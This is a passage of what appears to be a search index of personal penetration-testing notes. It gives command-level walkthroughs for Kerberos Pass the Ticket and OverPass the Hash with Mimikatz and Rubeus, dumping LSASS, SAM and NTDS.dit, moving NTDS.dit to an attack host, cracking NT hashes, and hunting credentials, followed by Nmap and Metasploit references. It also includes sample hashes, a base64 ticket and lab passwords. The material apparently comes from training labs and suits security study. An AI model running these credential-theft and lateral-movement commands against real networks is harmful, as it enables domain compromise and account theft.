Windows","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-export-tickets","title":"Mimikatz - Export Tickets","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::tickets /export\n&gt; exit\n&gt; dir *.kirbi\n</code></pre> <p>The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.</p> <p><code>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</code></p> <ul> <li><code>Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run \"sekurlsa::ekeys\" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.</code></li> </ul>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-export-tickets","title":"Rubeus - Export Tickets","text":"<pre><code>&gt; Rubeus.exe dump /nowrap\n</code></pre> <p><code>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</code></p> <p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-key-or-overpass-the-hash","title":"Pass the Key or OverPass the Hash","text":"<p>The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it. Also Will Schroeder adapted their project to create the Rubeus tool.</p> <p>To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-extract-kerberos-keys","title":"Mimikatz - Extract Kerberos Keys","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::ekeys\n</code></pre> <p>Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-pass-the-key-or-overpass-the-hash","title":"Mimikatz - Pass the Key or OverPass the Hash","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f\n</code></pre> <p>This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.</p> <p>To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-key-or-overpass-the-hash","title":"Rubeus - Pass the Key or OverPass the Hash","text":"<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap\n</code></pre> <p><code>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.</code></p> <p><code>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an \"encryption downgrade.\"</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-ptt","title":"Pass the Ticket (PtT)","text":"<p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p> <p>With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-ticket","title":"Rubeus Pass the Ticket","text":"<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt\n</code></pre> <p>Note that now it displays Ticket successfully imported!.</p> <p>Another way is to import the ticket into the current session using the .kirbi file from the disk.</p> <p>Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-ticket_1","title":"Rubeus - Pass the Ticket","text":"<pre><code>&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`\n</code></pre> <p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#convert-kirbi-to-base64-format","title":"Convert .kirbi to Base64 Format","text":"<pre><code>PS &gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"))`\n</code></pre> <p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-base64-format","title":"Pass the Ticket - Base64 Format","text":"<pre><code>&gt; Rubeus.exe ptt /ticket:  doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6achxvCNYTFWQq8vRODrOPHeztKqfJZJ/0d/1Klcd/wzzHUtrRwyl+aPiVpUaWIsmBohBC3QJP4v0EgMs0YHmMXXCoB5ZtLtnvw2bAmWUzzWr6puFOf94ViYdkanCbwK0UcIrZYmHcjAYuJ/kwY95cWmgdR5vEmc0DH4UMg1/CIZ6vPcc8QSOEW84xNJGkLfqi1oj9rMfUZ91T/crPZPKn1pL2JnLeAWUtzL0PQ8/4v5gnnC8dT8tjo0vC5zhmvxrs/8mwMVjU/ef0hNDt7W2XkwV8byDL8hKkgtXmYdlLySK0YKXoKjcYIIYUNyGghbZ0GrlWQx1/7JukyV20inRUsH5HW3e69V8q4+QgeHiXiQM3wFYt1p0LeaGsKUGLDz9TkDJiWNQSAejhjV5cMX7ZcBnj3oLZxyvHlVM1JWbilum4GxIDr4a8kUo3QNu7KbXhSmsWc6bQf9ZpxAq+l7Sj0M1bq9OX5//bqrtTLooXVOAai6lI6irtm0Nq8j2tuo0xbpWoMNA/JMdCLwv1EtGAmgPR4S01Vn57EwFwKQIKC3UU0FzKhBYX1HwW3yLLbNv5oZCaLH0CDiC3nUo89zPvbxfX5rZAqgA3wgnXBpGCNVAiF8CpEtbdc++r6rj87kf+2hDgdZ+gGyJgPXRCcrh64tlLwTlFWqIrvfllJpuElHNHxffq5F8MRQbuG9LSMeg3M4rxdsWYcHNHPQrx2PaAcL79s38GrB5d+w0mMnqs7IeHUY7o1GKVI6/5vohOjRGX8a+6Kfw8IgClGZozOxNyPzt0b0iibraEqycjBuuK0oReYGbOVhQtc9mDh8MDSVPsQb7Iw8Xa8ANRmSuI5QvkhlaPR+4zk39scpkst6kz6gLM9OUMmAB8Ui5Z2wd0Z39okn2B2rOWWcXWc6hYzMhryBQ8Ot+24chW3BoniXad0ZTrKHbKXPcIzc6CP6p/OG9cPwkY9SoDE7z9wZMyrtwDlfGNjVDTm7au3cYlsio6N7JUl95jJtfaYgF+34zBH6OxdsaK4E5asgxiO6BHzTs3JL+fsA5uuiB4BdaUcroN2wASM03YDnMWXs/J+9HeOisCT+PJtKO4Zz6G5VR3Fsn7OjNWbfuATkI/0q0LCxLTmM11yODh3hUMJEpml5RtHIQmWWOq3PFaY3+2PtpOUa6e0NBg0psWzPZdC2VH9uQ4T4d+Cc/GY2WCaw4mevkRdYbGRy9oH6be0mJojh96nObVw5wh4b5jMTyEoLPgWUTnDKXBamYavSnfpCn9FUxv1E3MvSKntfWVoh/7hwidjl1hZ8KTDDj9YoKk4AfcBroZpf79//9U1U4hKeqm7pLV0TUGZY6le458z8SmVYbEx9Uedc9GnMLutxDCR7RKWKTzFnAztattTLMRw8qx6bhWhx7CYf9LVuuCKj6RXw3xFHKj3Lr67zLA/L/Kx+jgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCBLj1p9IRkM2PHR+ehW/OPT/plYQ7hN71vQiTET7lli7qETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNDAzMjQxMTIxMThaphEYDzIwMjQwMzI0MjEyMTE4WqcRGA8yMDI0MDMzMTExMjExOFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWlubGFuZWZyZWlnaHQuaHRi\n</code></pre> <p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-pass-the-ticket","title":"Mimikatz - Pass the Ticket","text":"<pre><code>&gt; mimikatz.exe \n&gt; privilege::debug\n&gt; kerberos::ptt \"C:\\Users\\plaintext\\Desktop\\Mimikatz\\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"\n&gt; exit\n&gt; dir \\\\DC01.inlanefreight.htb\\c$\n</code></pre> <p><code>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-with-powershell-remoting-windows","title":"Pass The Ticket with PowerShell Remoting (Windows)","text":"<p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#mimikatz-powershell-remoting-with-pass-the-ticket","title":"Mimikatz - PowerShell Remoting with Pass the Ticket","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; kerberos::ptt \"C:\\Users\\Administrator.WIN01\\Desktop\\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi\"\n&gt; exit\n&gt; powershell\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-powershell-remoting-with-pass-the-ticket","title":"Rubeus - PowerShell Remoting with Pass the Ticket","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#create-a-sacrificial-process-with-rubeus","title":"Create a Sacrificial Process with Rubeus","text":"<pre><code>&gt; Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n</code></pre> <p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#rubeus-pass-the-ticket-for-lateral-movement","title":"Rubeus - Pass the Ticket for Lateral Movement","text":"<pre><code>&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt\n&gt; powershell\n&gt; Enter-PSSession -ComputerName DC01\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/","title":"Attacking Active Directory &amp; NTDS.dit","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#dictionary-attacks-against-ad-accounts-using-crackmapexec","title":"Dictionary Attacks against AD accounts using CrackMapExec","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#launching-the-attack-with-crackmapexec","title":"Launching the Attack with CrackMapExec","text":"<p><code>crackmapexec smb 10.129.201.57 -u jmarston -p /usr/share/wordlists/fasttrack.txt</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#capturing-ntdsdit","title":"Capturing NTDS.dit","text":"<p>Connecting to a DC with Evil-WinRM</p> <p>Checking Local Group Membership We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.</p> <pre><code>PS &gt; net localgroup\n</code></pre> <p>Checking User Account Privileges including Domain</p> <pre><code>PS &gt; net user bwilliamson\n</code></pre> <p>Creating Shadow Copy of C:</p> <pre><code>PS &gt; vssadmin CREATE SHADOW /For=C:\n</code></pre> <p>Copying NTDS.dit from the VSS</p> <pre><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n</code></pre> <p>Transferring NTDS.dit to Attack Host</p> <pre><code>PS &gt; cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData \n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#a-faster-method-using-cme-to-capture-ntdsdit","title":"A Faster Method: Using cme to Capture NTDS.dit","text":"<pre><code>$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/#cracking-hashes-gaining-credentials","title":"Cracking Hashes &amp; Gaining Credentials","text":"<pre><code>$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/","title":"Attacking LSASS","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#dumping-lsass-process-memory","title":"Dumping LSASS Process Memory","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#task-manager-method","title":"Task Manager Method","text":"<p>Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file A file called lsass.DMP is created and saved in:  <code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#rundll32exe-comsvcsdll-method","title":"Rundll32.exe &amp; Comsvcs.dll Method","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#finding-lsass-pid-in-cmd","title":"Finding LSASS PID in cmd","text":"<pre><code>&gt; tasklist /svc \n</code></pre> <p>and find lsass.exe and its process ID in the PID field.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#finding-lsass-pid-in-powershell","title":"Finding LSASS PID in PowerShell","text":"<pre><code>PS &gt; Get-Process lsass \n</code></pre> <p>and see the process ID in the Id field.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#creating-lsassdmp-using-powershell","title":"Creating lsass.dmp using PowerShell","text":"<pre><code>PS &gt; rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre> <p>If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#using-pypykatz-to-extract-credentials","title":"Using Pypykatz to Extract Credentials","text":"<p>Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a \"snapshot\" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. </p> <pre><code>$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#msv","title":"MSV","text":"<p>MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT &amp; SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#wdigest","title":"WDIGEST","text":"<p>WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update here.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#kerberos","title":"Kerberos","text":"<p>Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#dpapi","title":"DPAPI","text":"<p>The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:</p> Applications Use of DPAPI Internet Explorer Password form auto-completion data (username and password for saved sites). Google Chrome Password form auto-completion data (username and password for saved sites). Outlook Passwords for email accounts. Remote Desktop Connection Saved credentials for connections to remote machines. Credential Manager Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. <p>Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the Windows Privilege Escalation module.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/#cracking-the-nt-hash-with-hashcat","title":"Cracking the NT Hash with Hashcat","text":"<p>Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the Attacking SAM section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.</p> <pre><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/","title":"Attacking SAM","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/#using-regexe-save-to-copy-registry-hives","title":"Using reg.exe save to Copy Registry Hives","text":"<pre><code>&gt; reg.exe save hklm\\sam C:\\sam.save\n&gt; reg.exe save hklm\\system C:\\system.save\n&gt; reg.exe save hklm\\security C:\\security.save\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/#dumping-hashes-with-impackets-secretsdumppy","title":"Dumping Hashes with Impacket's secretsdump.py","text":"<pre><code>$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n\n$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/#cracking-hashes-with-hashcat","title":"Cracking Hashes with Hashcat","text":"<pre><code>$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/#remote-dumping-lsa-secrets-considerations","title":"Remote Dumping &amp; LSA Secrets Considerations","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/#dumping-lsa-secrets-remotely","title":"Dumping LSA Secrets Remotely","text":"<pre><code>$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/#dumping-sam-remotely","title":"Dumping SAM Remotely","text":"<pre><code>$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/CredentialHunting/","title":"Credential Hunting in Windows","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/CredentialHunting/#key-terms-to-search","title":"Key Terms to Search","text":"<p>Passwords   Passphrases     Keys Username    User account    Creds Users   Passkeys    Passphrases configuration   dbcredential    dbpassword pwd     Login   Credentials</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/CredentialHunting/#search-tools","title":"Search Tools","text":"<p>With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.</p> <p>By default, it will search various OS settings and the file system for files &amp; applications containing the key term entered in the search bar.</p> <p>Running Lazagne All We can also take advantage of third-party tools like Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.</p> <pre><code>&gt; start lazagne.exe all\n</code></pre> <p>Using findstr We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:</p> <pre><code>&gt; findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/CredentialHunting/#additional-considerations","title":"Additional Considerations","text":"<p>Here are some other places we should keep in mind when credential hunting:     - Passwords in Group Policy in the SYSVOL share     - Passwords in scripts in the SYSVOL share     - Password in scripts on IT shares     - Passwords in web.config files on dev machines and IT shares     - unattend.xml     - Passwords in the AD user or computer description fields     - KeePass databases --&gt; pull hash, crack and get loads of access.     - Found on user systems and shares     - Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint</p>"},{"location":"zNew/Enumeration/Discovery/Nmap/","title":"Nmap","text":""},{"location":"zNew/Enumeration/Discovery/Nmap/#delete","title":"delete","text":""},{"location":"zNew/Enumeration/Discovery/Nmap/#nmap","title":"Nmap:","text":"<pre><code>$ nmap -sC -sV -script vuln &lt;IP&gt;`\n$ nmap &lt;IP&gt; -p-`\n$ nmap &lt;IP&gt; -p &lt;PORT/S&gt;`\n$ nmap -sU 10.10.10.10`\n\n$ nmap -T4 -p- -v &lt;IP&gt;\n$ nmap -T4 -p &lt;PORT/S&gt; -A -sCV -v &lt;IP&gt;\n</code></pre> <pre><code>- `-sC` for the default scripts\n- `-sV` for Version and OS Enumeration\n- `-sU` UDP port scan\n- `-sn` Disables port scanning\n- `-script vuln` Check for vulnerabilities using the Nmap scripting engine\n- `-p-` Port scan all ports\n- `-p` Port scan for port x\n- `-v` Increase the verbosity level (use -vv or more for greater effect)\n</code></pre>"},{"location":"zNew/Enumeration/Discovery/Nmap/#host-scan","title":"Host Scan","text":"Scanning Options Description 10.129.2.28 Scans the specified target. -Pn Disables ICMP Echo requests. -O Performs operating system detection scan. -sn Disables port scanning. -PE Performs the ping scan by using 'ICMP Echo requests' against the target. --disable-arp-ping Disables ARP ping. --packet-trace Shows all packets sent and received. --reason Displays the reason a port is in a particular state."},{"location":"zNew/Enumeration/Discovery/Nmap/#port-scanning","title":"Port Scanning","text":"Scanning Options Description -p- Scans all ports. -p 137 Scans only the specified port. -sV Performs service version detection on specified ports. -sC Perform a Script Scan with scripts that are categorized as \"default\". -F Scans top 100 ports. -sU Performs a UDP scan. --top-ports= Scans the specified top ports that have been defined as most frequent."},{"location":"zNew/Enumeration/Discovery/Nmap/#tunning","title":"Tunning","text":"Scanning Options Description -v Increases the verbosity of the scan, which displays more detailed information. -A Performs service detection, OS detection, traceroute, and uses default scripts to scan the target. -T &lt;0-5&gt; Specifies the insane timing template. --script  Uses specified NSE scripts. --initial-rtt-timeout 50ms Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms Sets the specified time value as maximum RTT timeout. --max-retries 0 Sets the number of retries that will be performed during the scan. --min-parallelism  which frequency --min-rate 300 Sets the minimum number of packets to be sent per second. -n Disables DNS resolution."},{"location":"zNew/Enumeration/Discovery/Nmap/#evasion","title":"Evasion","text":"Scanning Options Description -sS Performs SYN scan on specified ports. -sA Performs ACK scan on specified ports -S Scans the target using different source IP addresses. -D RND:5 Generates five random IP addresses that indicates the source IP the connection comes from. --source-port 53 Performs the scans from specified source port."},{"location":"zNew/Enumeration/Discovery/Nmap/#save-the-result","title":"Save the result","text":"Scanning Options Description -oA target Saves the results in all formats, starting the name of each file with 'target'."},{"location":"zNew/Enumeration/Discovery/Nmap/#host-discovery","title":"Host Discovery","text":""},{"location":"zNew/Enumeration/Discovery/Nmap/#scan-network-range","title":"Scan Network Range","text":"<pre><code>$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n</code></pre>"},{"location":"zNew/Enumeration/Discovery/Nmap/#scan-ip-list","title":"Scan IP List","text":"<pre><code>sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n</code></pre>"},{"location":"zNew/Enumeration/Discovery/Nmap/#scan-multiple-ips","title":"Scan Multiple IPs","text":"<pre><code>$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5\n</code></pre>"},{"location":"zNew/Enumeration/Discovery/Nmap/#discovering-open-udp-ports","title":"Discovering Open UDP Ports","text":"<pre><code>$ sudo nmap 10.129.2.28 -F -sU\n</code></pre>"},{"location":"zNew/Enumeration/Discovery/Nmap/#different-formats","title":"Different Formats","text":"<p><code>sudo nmap 10.129.2.28 -p- -oA target</code></p>"},{"location":"zNew/Enumeration/Discovery/Nmap/#_1","title":"Nmap","text":"<pre><code>$ sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/","title":"Metasploit","text":""},{"location":"zNew/Metasploit/Metasploit/#delete","title":"delete","text":"<p>targeturi = blog</p>"},{"location":"zNew/Metasploit/Metasploit/#architecture","title":"Architecture","text":"<p><code>/usr/share/metasploit-framework</code></p>"},{"location":"zNew/Metasploit/Metasploit/#metasploit","title":"Metasploit","text":"<pre><code>$ msfconsole -q\n</code></pre>"},{"location":"zNew/Metasploit/Metasploit/#modules","title":"Modules","text":"<p>Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.</p> Type Description Auxiliary Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. Exploits Defined as modules that exploit a vulnerability that will allow for the payload delivery. Post Wide array of modules to gather information, pivot deeper, etc. <pre><code># Search Module \nmsf6 &gt; search &lt;KEYWORD&gt;\n\n# Select Module\nmsf6 &gt; use &lt;PATH&gt;\nmsf6 &gt; use &lt;NUMBER&gt;\n\n# Show Module Info\nmsf6 &lt;TYPE&gt;(&lt;Module&gt;) &gt; info\n\n# Show all options\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; show options\n\n# Define option to exploit\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; set &lt;OPTIONS&gt; &lt;VALUE&gt;\n\n# Run the exploit\nmsf6 &lt;TYPE&gt;(&lt;MODULE&gt;) &gt; 